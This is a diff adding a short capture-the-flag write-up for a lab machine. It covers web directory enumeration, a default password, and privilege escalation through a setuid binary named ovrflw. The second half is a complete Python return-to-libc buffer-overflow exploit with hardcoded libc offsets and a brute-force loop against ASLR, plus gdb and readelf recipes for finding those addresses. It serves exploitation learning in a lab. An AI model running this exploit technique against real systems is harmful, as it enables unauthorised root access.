@@ -1,0 +1,41 @@
+(Love this box!!! Learnt a lot of linux binary)
+Points:
+- dirbuster. (be patient) => backend/
+- default password
+- find files with setuid => /usr/local/bin/ovrflw => the video is a really good tutorial of gdb
+- checksec => aslr on, dep on
+- use 'echo 0 > /proc/sys/kernel/randomize_va_space' to disable aslr on our kali. So we can do easier version first.
+- dep => use 'return to libc'. Put "/bin/bash" string on stack, and call 'system' function because it is in the libc and with execution privilege. Write a small program with 'system("/bin/bash")' and check it in gdb.
+- debug on the target machine to get at least one working address
+- try many times until it works
+
+Details:
+- searchmem '/bin/sh'
+- ldd /usr/local/bin/ovrflw => find at least one working libc base addr
+- readelf -s <path to libc.so.6> | grep <func> => get function offest to the base addr
+- strings -a -t x <path to libc.so.6> | grep '/bin/sh' => get /bin/sh offset
+
+final code:
+```
+from subprocess import call
+import struct
+
+libc_base = 0xb75c4000
+
+system_off = 0x00040310         # don't forget to add '0x'
+exit_off = 0x00033260
+arg_off = 0x162bac
+
+system_addr = struct.pack("<I", libc_base + system_off)
+exit_addr = struct.pack("<I", libc_base + exit_off)
+arg_addr = struct.pack("<I", libc_base + arg_off)
+
+buf = 'A' * 112
+buf += system_addr      # ret to 'system'
+buf += exit_addr        # first element on the stack
+buf += arg_addr         # second element on the stack, the arg for 'system'
+
+for i in range(512):
+        print("Try %d" % i)
+        ret = call(['/usr/local/bin/ovrflw', buf])
+```
